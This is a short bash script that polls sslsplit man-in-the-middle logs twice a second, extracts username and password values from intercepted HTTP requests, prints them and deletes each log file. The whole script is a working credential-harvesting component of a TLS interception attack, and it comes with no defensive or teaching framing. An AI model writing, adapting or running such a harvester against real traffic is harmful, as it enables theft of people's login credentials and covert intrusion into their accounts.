#!/usr/bin/env bash

cd "$(dirname "$0")" || exit 1


while sleep .5; do
	find './sslsplit-log/' -name '*.log' | while read -r file; do
		q="$(grep 'username=' "$file" | perl -pe 's#HTTP/.*?$##')"
		u="$(echo "$q" | grep -oP 'username=\K[^&]*')"
		p="$(echo "$q" | grep -oP 'password=\K[^&]*')"
		if [ "x$u" != "x" ] && [ "x$p" != "x" ]; then
			echo
			echo "Username: $u"
			echo "Password: $p"
		fi
		rm "$file"
	done

	if [[ ! -f 'sslsplit.pid' ]]; then
		exit
	fi
done
